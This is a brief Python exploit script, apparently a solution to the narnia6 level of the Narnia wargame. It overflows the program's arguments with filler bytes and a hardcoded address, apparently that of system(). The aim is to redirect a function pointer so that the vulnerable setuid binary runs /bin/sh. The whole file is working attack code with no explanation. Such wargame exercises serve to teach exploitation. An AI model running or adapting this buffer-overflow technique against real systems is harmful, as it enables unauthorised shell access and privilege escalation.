#!/usr/bin/python
# wrapper for narnia6

import os

argv1 = "\x41"*8 + "\x50\xa2\xe6\xf7"
argv2 = "\x42"*8 + "/bin/sh"

# 0xffffd6cc

os.execv("/narnia/narnia6", ["/narnia/narnia6", argv1, argv2])

